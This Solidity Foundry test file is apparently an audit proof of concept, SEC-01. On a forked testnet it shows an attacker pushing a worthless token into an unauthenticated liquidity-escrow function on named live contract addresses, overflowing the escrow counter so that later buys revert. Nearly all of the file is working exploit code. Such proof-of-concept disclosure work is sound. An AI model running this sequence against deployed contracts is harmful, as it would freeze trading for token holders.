// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ILockedLPLive {
    function addLockedLiquidity(address token, address quote, uint256 tokenAmount, uint256 quoteAmount)
        external
        returns (uint256);
    function positions(address token)
        external
        view
        returns (address, address, uint256, uint256, uint256 escrowQuote, bool, uint128);
}

interface ICurveLive {
    function buy(uint256 quoteIn, uint256 minTokensOut, uint256 deadline) external returns (uint256);
}

contract Junk is ERC20 {
    constructor() ERC20("junk", "J") {
        _mint(msg.sender, type(uint256).max);
    }
}

/// @notice SEC-01 PoC against the LIVE v2 stack on an RH testnet fork (read-only simulation, no tx sent).
///         Run: RH_FORK=1 forge test --match-contract LockedLPForkPoC -vv
contract LockedLPForkPoC is Test {
    address constant LOCKED_LP = 0xc2D4c8796A8753c61c77bC65AE523DDecd1dF5e3;
    address constant TEST_TOKEN = 0x8461758dE934179110A11dF6665E827C6b5f9408;
    address constant TEST_CURVE = 0x326B89927FB8170715b14a5fA25a9940B1A82031;
    address constant STRATEGY = 0xd4d0eB01960AACE441bFcb323Bfaf7c3d8b555a3;

    function test_poc_live_v2_coin_bricked() public {
        if (!vm.envOr("RH_FORK", false)) return;
        vm.createSelectFork("https://rpc.testnet.chain.robinhood.com");
        address trader = makeAddr("trader");
        deal(STRATEGY, trader, 1_000 ether);
        // baseline: a buy works
        uint256 snap = vm.snapshotState();
        vm.startPrank(trader);
        IERC20(STRATEGY).approve(TEST_CURVE, type(uint256).max);
        assertGt(ICurveLive(TEST_CURVE).buy(100 ether, 0, block.timestamp + 1), 0);
        vm.stopPrank();
        vm.revertToState(snap);

        // attacker poisons escrow with a worthless token (no auth on live LockedLP)
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        Junk j = new Junk();
        j.approve(LOCKED_LP, type(uint256).max);
        (,,,, uint256 esc,,) = ILockedLPLive(LOCKED_LP).positions(TEST_TOKEN);
        ILockedLPLive(LOCKED_LP).addLockedLiquidity(TEST_TOKEN, address(j), 0, type(uint256).max - esc);
        vm.stopPrank();

        vm.startPrank(trader);
        IERC20(STRATEGY).approve(TEST_CURVE, type(uint256).max);
        vm.expectRevert(); // arithmetic overflow in escrowQuote += lpShare
        ICurveLive(TEST_CURVE).buy(100 ether, 0, block.timestamp + 1);
        vm.stopPrank();
    }
}
